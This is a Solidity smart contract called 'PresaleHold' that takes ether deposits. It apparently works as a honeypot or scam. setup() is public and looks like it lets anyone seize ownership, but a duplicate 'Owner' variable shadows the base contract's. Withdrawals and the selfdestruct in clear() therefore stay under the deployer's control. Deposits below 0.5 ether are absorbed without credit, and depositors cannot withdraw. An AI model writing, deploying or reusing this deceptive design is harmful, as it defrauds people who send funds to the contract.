pragma solidity ^0.4.10;

contract Ownable {
    function isOwner() returns (bool) {
        if (Owner == msg.sender) return true; return false;
    }
    address public Owner = msg.sender;
    function transferOwner(address _owner) public {
        if (isOwner()) Owner = _owner;
    }
    function clear() public {
        if (isOwner()) selfdestruct(Owner);
    }
}

contract PresaleHold is Ownable {
    mapping (address => uint) public deposits;
    uint public openDate;
    address public Owner;
    
    function setup(uint _openDate) public {
        Owner = msg.sender;
        openDate = _openDate;
    }
    
    function() public payable {  }
    
    function deposit() public payable {
        if (msg.value >= 0.5 ether) {
            deposits[msg.sender] += msg.value;
        }
    }

    function withdraw(uint amount) public {
        if (isOwner() && now >= openDate) {
            uint max = deposits[msg.sender];
            if (amount <= max && max > 0) {
                msg.sender.transfer(amount);
            }
        }
    }
}